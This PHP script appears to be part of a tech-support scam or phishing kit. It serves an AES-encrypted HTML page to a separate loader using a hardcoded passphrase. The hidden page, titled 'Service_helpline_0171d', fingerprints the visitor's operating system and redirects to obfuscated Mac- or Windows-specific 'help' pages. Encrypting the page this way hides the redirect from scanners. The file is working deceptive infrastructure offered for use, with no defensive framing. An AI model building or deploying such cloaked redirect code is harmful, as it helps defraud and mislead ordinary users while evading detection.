<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Preflight request handle karein
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// 🔑 PASSPHRASE (Must match your loader)
$PASSPHRASE = "MySecretKey@123";

$HTML_CONTENT = <<<'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service_helpline_0171d</title>
    <script src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
    <script>
        // ये वैल्यू Loader द्वारा Replace की जाएँगी
        var ALPHA = '{{ALPHA}}';
        var ANIPH = '{{ANIPH}}';

        function myOperatingSystem() {
            const ua = navigator.userAgent;
            if (ua.indexOf("Win") !== -1) return "Windows";
            if (ua.indexOf("Mac") !== -1) return "MacOS";
            if (ua.indexOf("Linux") !== -1) return "Linux";
            if (ua.indexOf("Android") !== -1) return "Android";
            if (ua.indexOf("iOS") !== -1) return "iOS";
            return "Unknown";
        }

        var os = myOperatingSystem();
        localStorage.setItem('alpha', ALPHA);
        if (os === 'MacOS') {
            window.location.href = "Ma0cHelpAsMEr0t0140/index.html?Aniph=" + ANIPH;
        } else {
            window.location.href = "Wi0nHelpAsMEr0t0140/index.html?Aniph=" + ANIPH;
        }
    </script>
</head>
<body></body>
</html>
HTML;
// ============================================================
// 🔐 ENCRYPTION (OpenSSL Salted Format – CryptoJS Compatible)
// ============================================================
function encrypt_salted($data, $passphrase) {
    $salt = openssl_random_pseudo_bytes(8);
    $salted = '';
    $dx = '';
    while (strlen($salted) < 48) {
        $dx = md5($dx . $passphrase . $salt, true);
        $salted .= $dx;
    }
    $key = substr($salted, 0, 32);
    $iv = substr($salted, 32, 16);
    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode('Salted__' . $salt . $ciphertext);
}

// 🚀 Output JSON
$cipher = encrypt_salted($HTML_CONTENT, $PASSPHRASE);
echo json_encode(['cipher' => $cipher]);